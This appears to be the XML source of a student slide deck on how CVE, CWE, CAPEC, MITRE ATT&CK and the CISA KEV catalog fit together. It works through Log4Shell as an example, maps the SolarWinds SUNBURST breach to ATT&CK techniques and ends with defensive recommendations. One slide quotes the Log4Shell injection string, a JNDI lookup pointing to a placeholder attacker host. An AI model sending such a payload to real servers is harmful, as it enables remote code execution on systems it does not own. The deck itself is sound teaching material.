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ist" panose="020B0604020202020204" charset="0"/>
      <p:regular r:id="rId17"/>
    </p:embeddedFont>
    <p:embeddedFont>
      <p:font typeface="Geis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24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10457"/>
            <a:ext cx="4722763" cy="8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Cybersecurity Frameworks &amp; Threat Intelligence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02694"/>
            <a:ext cx="4722763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structured deep-dive into how vulnerabilities, attack patterns, and industry frameworks connect to form a complete picture of modern cyber threats — and how defenders use them to stay ahead.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135511"/>
            <a:ext cx="1405012" cy="203448"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 20487"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="00194D"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Text 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="570533" y="3172718"/>
            <a:ext cx="1713384" cy="1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20–30 MIN PRESENTATION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963117" y="3125986"/>
            <a:ext cx="1741810" cy="222498"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 18733"/>
            </a:avLst>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="9525">
            <a:solidFill>
              <a:srgbClr val="629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47056" y="3172718"/>
            <a:ext cx="2031132" cy="1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CYBERSECURITY FUNDAMENTALS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96119" y="3410471"/>
            <a:ext cx="1516931" cy="222498"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 18733"/>
            </a:avLst>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="9525">
            <a:solidFill>
              <a:srgbClr val="629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058" y="3457203"/>
            <a:ext cx="1806253" cy="1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REAL-WORLD CASE STUDIES</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="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31F424-EBA0-7D92-8092-05F594A68A12}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="366311" y="4076132"/>
            <a:ext cx="383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Presentation assignment by</a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" dirty="0">
              <a:latin typeface="Giest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E55B4-E826-3562-90AA-A6B7CD93DE00}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="366311" y="4426527"/>
            <a:ext cx="295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2F5FA"/>
                </a:solidFill>
                <a:latin typeface="Geist Bold" pitchFamily="34" charset="0"/>
                <a:cs typeface="Geist Bold" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Latheesh </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="F2F5FA"/>
                </a:solidFill>
                <a:latin typeface="Geist Bold" pitchFamily="34" charset="0"/>
                <a:cs typeface="Geist Bold" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>kumar</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F2F5FA"/>
                </a:solidFill>
                <a:latin typeface="Geist Bold" pitchFamily="34" charset="0"/>
                <a:cs typeface="Geist Bold" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t> . M</a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" dirty="0">
              <a:latin typeface="Gies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7564"/>
            <a:ext cx="20077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598712"/>
            <a:ext cx="4008909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2187848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presentation is structured in three progressive parts — from foundational concepts to real-world correlation. Each section builds on the last, culminating in a complete end-to-end attack story.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49885"/>
            <a:ext cx="248022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52589"/>
            <a:ext cx="2634555" cy="1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943151"/>
            <a:ext cx="171673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1 — Fundamentals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3219152"/>
            <a:ext cx="2634555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Vulnerability vs. Weakness vs. Exploit · CVE, CWE &amp; CAPEC overview and how they connect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54648" y="2649885"/>
            <a:ext cx="248022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852589"/>
            <a:ext cx="2634630" cy="142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54648" y="2943151"/>
            <a:ext cx="179434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2 — MITRE ATT&amp;CK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54648" y="3219152"/>
            <a:ext cx="2634630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Tactics vs. Techniques · ATT&amp;CK Matrix structure · Mapping a real-world breach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013252" y="2649885"/>
            <a:ext cx="248022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852589"/>
            <a:ext cx="2634555" cy="142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13252" y="2943151"/>
            <a:ext cx="2594521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3 — KEV &amp; Threat Storytelling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13252" y="3219152"/>
            <a:ext cx="2634555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Known Exploited Vulnerabilities catalog · End-to-end attack scenario · Business impact &amp; defenses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8E6E9D1-7D21-7E1E-4575-D4B0E0CBA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529" y="4752920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1970"/>
            <a:ext cx="217393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1 —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893118"/>
            <a:ext cx="8151763" cy="8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Vulnerability, Weakness &amp; Exploit: What's the Difference?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885355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three terms are often used interchangeably, but each represents a distinct layer in the attack chain. Understanding the distinction is the foundation of all vulnerability management.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81831" y="2347392"/>
            <a:ext cx="2634555" cy="1358801"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 5363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380" y="2485653"/>
            <a:ext cx="15505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🔧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Weakness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80" y="2761655"/>
            <a:ext cx="2358033" cy="806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flaw in design, implementation, or configuration that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creates the potential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a vulnerability. It is the root cause — often systemic and reusable across many products.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347392"/>
            <a:ext cx="2634630" cy="1358801"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 3834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909" y="2485653"/>
            <a:ext cx="15505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🎯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Vulnerability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92909" y="2761655"/>
            <a:ext cx="2358107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specific, identifiable instance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a weakness in a real product or system. It can be assigned a CVE ID and has a defined scope, version, and vendor.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3252" y="2347392"/>
            <a:ext cx="2634555" cy="1358801"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 3834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1513" y="2485653"/>
            <a:ext cx="15505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💥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Exploit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1513" y="2761655"/>
            <a:ext cx="2358033" cy="806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piece of code, technique, or method that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actively takes advantage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a vulnerability. An exploit turns a theoretical risk into a real-world compromise.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845719"/>
            <a:ext cx="8151763" cy="655811"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 7944"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="022349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011216"/>
            <a:ext cx="155004" cy="1239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99071" y="4000649"/>
            <a:ext cx="7624837" cy="327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Real-World Example — Log4Shell (CVE-2021-44228):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</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="9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weakness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was unsafe JNDI lookup handling in Log4j. The </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="9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vulnerability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was the specific flaw in Log4j 2.0–2.14.1. The </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="9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exploit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was the crafted string </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="9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${jndi:ldap://attacker.com/a}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sent to vulnerable servers.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E230E1-90D1-ACC9-6DD7-102B5E46A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29" y="4720015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74303"/>
            <a:ext cx="2002408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1 —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8379" y="620762"/>
            <a:ext cx="8167241" cy="79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CVE, CWE &amp; CAPEC: The Three Pillars of Vulnerability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0496" y="1594545"/>
            <a:ext cx="4110484" cy="2724448"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 3227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2536" y="1714723"/>
            <a:ext cx="198350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They Connect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2536" y="2033290"/>
            <a:ext cx="386640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These three frameworks form a logical chain from root cause to attacker behavior. Together, they allow defenders to understand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went wrong,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it exists, and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it can be abused.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00" y="2628602"/>
            <a:ext cx="183133" cy="1831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9311" y="2640881"/>
            <a:ext cx="34696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CWE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underlying weakness type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00" y="3223022"/>
            <a:ext cx="183133" cy="183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9311" y="3235300"/>
            <a:ext cx="34696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actual vulnerable instance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300" y="3817441"/>
            <a:ext cx="183133" cy="183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9311" y="3829720"/>
            <a:ext cx="34696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CAPEC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attack pattern used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65" y="1729755"/>
            <a:ext cx="3934718" cy="2196108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65" y="1729755"/>
            <a:ext cx="3934718" cy="21961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8379" y="4454203"/>
            <a:ext cx="81672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mapping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CVE → CWE → CAPEC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the core analytical exercise in this assignment. It demonstrates that you understand not just what a vulnerability is, but why it exists and how attackers find and use it.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E17-4307-07B7-3FE7-E93BF62B1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71" y="4723208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2939"/>
            <a:ext cx="20077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1 —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024086"/>
            <a:ext cx="8043714" cy="4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Mapping CVE → CWE → CAPEC: A Worked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613222"/>
            <a:ext cx="8608963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Let's walk through a concrete example using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CVE-2021-44228 (Log4Shell)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show how all three frameworks interlock in practice.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914004"/>
            <a:ext cx="2634555" cy="2456557"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 2121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406" y="1928292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</p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Text 5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1720379" y="1986260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4380" y="2424336"/>
            <a:ext cx="185819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CVE — CVE-2021-44228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2700338"/>
            <a:ext cx="2358033" cy="112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Remote Code Execution in Apache Log4j2</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="9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Scope: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Log4j versions 2.0-beta9 through 2.14.1</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="9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CVSS Score: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10.0 (Critical)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="9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Impact: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Full server compromise via a single log entry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1914004"/>
            <a:ext cx="2634630" cy="2456557"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 2121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35" y="1928292"/>
            <a:ext cx="2606055" cy="372070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908" y="1986260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92909" y="2424336"/>
            <a:ext cx="2358107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CWE — CWE-502: Deserialization of Untrusted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2909" y="3103513"/>
            <a:ext cx="2358107" cy="96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Root Cause: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Log4j's JNDI lookup feature deserializes data from external sources without proper validation.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="9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it matters: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This weakness class appears across hundreds of CVEs in Java applications.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252" y="1914004"/>
            <a:ext cx="2634555" cy="2456557"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 2121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7539" y="1928292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</p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="17" name="Text 15"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7237512" y="1986260"/>
            <a:ext cx="186035" cy="241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51513" y="2424336"/>
            <a:ext cx="2358033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CAPEC — CAPEC-510: Exploiting Trust in Client-Side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1513" y="3103513"/>
            <a:ext cx="2358033" cy="112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Attack Pattern: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Attacker injects a malicious JNDI lookup string into a loggable field (e.g., HTTP header). The server logs it, triggering an outbound connection to attacker-controlled infrastructure and executing arbitrary code.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ABD7B5-2BA3-E262-4090-1C170E4D3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492" y="4752920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741"/>
            <a:ext cx="225154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2 — MITRE ATT&amp;CK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753889"/>
            <a:ext cx="8151763" cy="8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Understanding the MITRE ATT&amp;CK Framework: Tactics &amp; Techniques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857747"/>
            <a:ext cx="4347270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MITRE ATT&amp;CK (Adversarial Tactics, Techniques, and Common Knowledge) is a globally used knowledge base of adversary behavior. It describes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attackers do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after they gain initial access — not just how they get in.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81039"/>
            <a:ext cx="2111648" cy="1730871"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 3962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2481039"/>
            <a:ext cx="57150" cy="17308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7242" y="2619301"/>
            <a:ext cx="15505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Tactic — The "Why"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7242" y="2944862"/>
            <a:ext cx="1792263" cy="96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tactical goal of the attacker. Examples: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Initial Access, Execution, Credential Access, Exfiltration.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Tactics are the column headers of the ATT&amp;CK matrix.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31740" y="2481039"/>
            <a:ext cx="2111648" cy="1730871"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 3962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53" y="2481039"/>
            <a:ext cx="57150" cy="17308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12864" y="2619301"/>
            <a:ext cx="1754535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Technique — The "How"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12864" y="2944862"/>
            <a:ext cx="1792263" cy="1128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specific method used to achieve a tactic. Example: Under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Initial Access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technique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T1566.001 — Spear Phishing Link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describes sending targeted malicious links.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061421" y="1746126"/>
            <a:ext cx="3680445" cy="2894633"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 3085"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="12386E">
              <a:alpha val="9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185395" y="1870100"/>
            <a:ext cx="20077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ATT&amp;CK Matrix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185395" y="2195661"/>
            <a:ext cx="3432497" cy="4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matrix organizes 14+ tactics as columns, with techniques listed under each. It covers the full attack lifecycle — from reconnaissance to impact.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185395" y="2818954"/>
            <a:ext cx="1654225" cy="478110"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 10897"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="12386E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23656" y="2957215"/>
            <a:ext cx="137770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Reconnaissance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63594" y="2818954"/>
            <a:ext cx="1654299" cy="478110"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 10897"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="12386E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01855" y="2957215"/>
            <a:ext cx="137777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Initial Access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185395" y="3421038"/>
            <a:ext cx="1654225" cy="478110"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 10897"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="12386E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23656" y="3559299"/>
            <a:ext cx="137770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963594" y="3421038"/>
            <a:ext cx="1654299" cy="478110"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 10897"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="12386E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01855" y="3559299"/>
            <a:ext cx="137777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185395" y="4023122"/>
            <a:ext cx="3432497" cy="478110"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 10897"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="12386E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23656" y="4161383"/>
            <a:ext cx="1550566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Exfiltration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8C73068-44F1-893B-6004-F5B231DF5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629" y="4687591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34119"/>
            <a:ext cx="260821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2 — Real Attack Mapping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72901" y="571202"/>
            <a:ext cx="6347668" cy="3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Mapping a Real Breach to MITRE ATT&amp;CK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72901" y="1124396"/>
            <a:ext cx="8198197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Using the </a:t>
            </a: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SolarWinds SUNBURST supply chain attack (2020)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we can map adversary behavior to specific ATT&amp;CK techniques — demonstrating how the framework supports threat intelligence and detection engineering.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2901" y="1551310"/>
            <a:ext cx="8198197" cy="2528515"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 196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7664" y="1556072"/>
            <a:ext cx="8188672" cy="294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5982" y="1628403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Tactic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36068" y="1628403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Technique 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83199" y="1628403"/>
            <a:ext cx="2672655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Technique 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39756" y="1628403"/>
            <a:ext cx="2265611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SUNBURST Behavior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664" y="1850827"/>
            <a:ext cx="8188672" cy="4448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5982" y="1923157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Initial Access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36068" y="1923157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T1195.002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83199" y="1923157"/>
            <a:ext cx="2215455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Supply Chain Compromise: Compromise Software Supply Chain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39756" y="1923157"/>
            <a:ext cx="180841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Malicious code injected into SolarWinds Orion build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7664" y="2295674"/>
            <a:ext cx="8188672" cy="4448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5982" y="2368004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Execution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36068" y="2368004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T1059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83199" y="2368004"/>
            <a:ext cx="2672655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Command and Scripting Interpreter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39756" y="2368004"/>
            <a:ext cx="180841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PowerShell used for post-exploitation commands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664" y="2740521"/>
            <a:ext cx="8188672" cy="4448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5982" y="2812852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Credential Access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36068" y="2812852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T1110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83199" y="2812852"/>
            <a:ext cx="2672655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Brute Force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39756" y="2812852"/>
            <a:ext cx="180841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Password spraying against discovered accounts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664" y="3185368"/>
            <a:ext cx="8188672" cy="4448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5982" y="3257699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36068" y="3257699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T1074.001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83199" y="3257699"/>
            <a:ext cx="2672655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Staged: Local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39756" y="3257699"/>
            <a:ext cx="180841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Email and file data staged before exfiltration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7664" y="3630216"/>
            <a:ext cx="8188672" cy="4448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95982" y="3702546"/>
            <a:ext cx="1856184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Exfiltration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36068" y="3702546"/>
            <a:ext cx="2263229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T1041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83199" y="3702546"/>
            <a:ext cx="2672655" cy="150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Exfiltration Over C2 Channel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39756" y="3702546"/>
            <a:ext cx="1808411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sent over encrypted channel mimicking normal traffic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901" y="4206553"/>
            <a:ext cx="8198197" cy="602828"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 8237"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="00194D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71" y="4365129"/>
            <a:ext cx="147786" cy="11817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57027" y="4348758"/>
            <a:ext cx="7695902" cy="300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Mapping real breaches to ATT&amp;CK helps defenders identify detection gaps, prioritize controls, and communicate threat behavior in a standardized language across teams.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8A8964E-947D-9DC9-F24C-6995E427D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541" y="4848746"/>
            <a:ext cx="1762371" cy="2947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5947"/>
            <a:ext cx="207466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3 — KEV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277094"/>
            <a:ext cx="8151763" cy="8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Known Exploited Vulnerabilities: Why Active Exploitation Changes Everything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2269331"/>
            <a:ext cx="8151763" cy="32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CISA's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Known Exploited Vulnerabilities (KEV) Catalog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a curated list of vulnerabilities with confirmed, active exploitation in the wild. It is the single most actionable vulnerability prioritization resource available to defenders.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31368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196456"/>
            <a:ext cx="1928440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the KEV Catalog?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3472458"/>
            <a:ext cx="2613868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Maintained by CISA, it lists CVEs with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 of active exploitation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Federal agencies are mandated to remediate KEV-listed vulnerabilities within defined timelines.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731368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4991" y="3196456"/>
            <a:ext cx="1838102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Severity vs. Exploitation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64991" y="3472458"/>
            <a:ext cx="2613943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CVSS 9.0 vulnerability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KEV may be less urgent than a CVSS 7.5 that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KEV.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Active exploitation trumps theoretical severity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prioritization decisions.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731368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3939" y="3196456"/>
            <a:ext cx="2510954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Organizations Prioritize KEV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33939" y="3472458"/>
            <a:ext cx="2613943" cy="64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KEV entries represent </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="9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proven attacker interest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Patching KEV vulnerabilities first dramatically reduces the probability of a successful breach with limited resources.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B362E5-A37D-FF63-3DF9-307FDB1AB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910" y="4752920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42515"/>
            <a:ext cx="1866528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Part 3 — Threat Storytelling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285875" y="400348"/>
            <a:ext cx="587729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End-to-End Attack Story: Connecting All Frameworks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5875" y="755154"/>
            <a:ext cx="6572250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true power of these frameworks emerges when used together. Here is the recommended narrative flow for presenting any vulnerability end-to-end — from root cause to business impact.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999232"/>
            <a:ext cx="65532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999232"/>
            <a:ext cx="6553200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5875" y="4719786"/>
            <a:ext cx="6572250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structure demonstrates </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="6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analytical thinking</a:t>
            </a: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you're not just reciting definitions, you're showing how each framework contributes a unique lens to understanding and defending against the same threat.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="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7997B-3E28-389A-815C-BE7B03BA9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075" y="4705620"/>
            <a:ext cx="1304925" cy="390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37914"/>
            <a:ext cx="1910804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162" y="570384"/>
            <a:ext cx="7079084" cy="377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Takeaways &amp; Defensive Recommendations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381446" y="1111821"/>
            <a:ext cx="4132436" cy="3693765"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 2267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7681" y="1220837"/>
            <a:ext cx="2502471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Concepts to Remember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7681" y="1532334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1F2A5D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338" y="1587550"/>
            <a:ext cx="151120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Weakness → Vulnerability → Exploit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the attacker's path — understand each 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5791" y="1532334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1F2A5D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6447" y="1587550"/>
            <a:ext cx="1511201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CVE, CWE, CAPEC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are complementary — always map all three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7681" y="2391370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1F2A5D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338" y="2446586"/>
            <a:ext cx="1511201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KEV status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overrides CVSS score for real-world prioritization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5791" y="2391370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1F2A5D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6447" y="2446586"/>
            <a:ext cx="1511201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MITRE ATT&amp;CK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translates attacker behavior into detectable patterns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18596" y="1220837"/>
            <a:ext cx="2526134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Defensive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8596" y="1532334"/>
            <a:ext cx="1927994" cy="998265"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 687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08" y="1532334"/>
            <a:ext cx="57150" cy="9982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1980" y="1662857"/>
            <a:ext cx="1453604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Patch Management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1980" y="1960736"/>
            <a:ext cx="1624087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Prioritize KEV-listed CVEs immediately. Automate patching where possible.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55606" y="1532334"/>
            <a:ext cx="1927994" cy="998265"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 687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319" y="1532334"/>
            <a:ext cx="57150" cy="9982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28991" y="1662857"/>
            <a:ext cx="1453604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28991" y="1960736"/>
            <a:ext cx="1624087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Never trust external input. Sanitize all user-supplied data before processing or logging.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18596" y="2639616"/>
            <a:ext cx="1927994" cy="1333574"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 5143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308" y="2639616"/>
            <a:ext cx="57150" cy="13335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91980" y="2770138"/>
            <a:ext cx="1624087" cy="377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Threat Intelligence Integration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91980" y="3256880"/>
            <a:ext cx="1624087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Map detected events to ATT&amp;CK techniques. Use CWE data to find systemic code-level weaknesses.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755606" y="2639616"/>
            <a:ext cx="1927994" cy="1333574"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 5143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319" y="2639616"/>
            <a:ext cx="57150" cy="13335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28991" y="2770138"/>
            <a:ext cx="16214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Continuous Monitoring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928991" y="3068017"/>
            <a:ext cx="1624087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 for known exploit patterns (CAPEC) and anomalous post-exploitation behavior (ATT&amp;CK).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718596" y="4095824"/>
            <a:ext cx="3965004" cy="587127"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 8319"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="183A13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30" y="4253657"/>
            <a:ext cx="145331" cy="1162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96396" y="4233863"/>
            <a:ext cx="347097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Remember:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="9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goal is not memorization — it's understanding how these frameworks connect to tell a complete threat story.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0044D86-05C1-519E-4495-C198F4B68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629" y="4712615"/>
            <a:ext cx="1762371" cy="390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1305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Giest bold</vt:lpstr>
      <vt:lpstr>Geist Bold</vt:lpstr>
      <vt:lpstr>Arial</vt:lpstr>
      <vt:lpstr>Consolas</vt:lpstr>
      <vt:lpstr>Geist Light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Menakuru Latheesh</cp:lastModifiedBy>
  <cp:revision>4</cp:revision>
  <dcterms:created xsi:type="dcterms:W3CDTF">2026-05-23T11:46:47Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2026-05-23T12:50:10Z</dcterms:modified>
</cp:coreProperties>
</file>